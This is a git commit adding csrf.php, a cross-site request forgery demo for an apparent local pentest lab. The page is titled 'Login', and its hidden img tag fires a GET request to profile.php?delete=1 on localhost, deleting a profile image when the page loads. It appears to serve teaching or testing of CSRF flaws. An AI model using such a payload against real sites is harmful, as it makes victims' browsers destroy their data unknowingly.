49b84a2a580de0b51d458465bf0551c9244a5dc7
Timo Fisher <fisher.timo250@gmail.com>
2020-10-08 14:55:53 +0200

    CSRF demo with GET request that deletes an image

---
+++ csrf.php
@@ -0,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title>Login</title>
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
+        <link href="style.css" rel="stylesheet" type="text/css">
+    </head>
+	<body>
+		<div class="login">
+			<h1>Vulnerable site</h1>
+			<img src="http://localhost/SecookiePentest/profile.php?delete=1" alt="...">
+		</div>
+	</body>
+</html>
